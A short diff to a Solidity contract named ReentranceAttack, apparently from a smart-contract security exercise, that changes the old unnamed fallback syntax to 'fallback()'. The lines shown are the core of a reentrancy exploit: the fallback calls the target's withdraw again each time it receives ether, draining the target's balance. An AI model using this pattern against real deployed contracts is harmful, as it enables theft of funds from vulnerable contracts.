@@ -19,7 +19,7 @@ contract ReentranceAttack {
     target.withdraw(address(target).balance);
   }
 
-  function() external payable {
+  fallback() external payable {
     target.withdraw(1);
   }
 }
